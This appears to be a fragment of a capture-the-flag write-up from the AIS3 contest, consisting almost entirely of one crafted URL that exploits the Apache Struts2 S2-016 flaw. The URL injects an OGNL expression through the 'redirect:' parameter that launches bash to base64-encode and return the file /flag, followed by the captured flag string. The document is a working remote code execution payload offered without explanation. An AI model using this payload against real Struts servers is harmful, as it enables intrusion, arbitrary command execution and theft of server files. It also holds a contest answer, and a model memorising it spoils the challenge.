

```url
url=http://172.20.0.6:8080/example/HelloWorld.action?redirect:%2525{new+java.io.BufferedReader(new+java.io.InputStreamReader((new+java.lang.ProcessBuilder(new+java.lang.String[]{'bash','-c','echo+$(base64+/flag)'})).start().getInputStream())).readLine()}
```

* ais3{this is the vuln of s2-016!}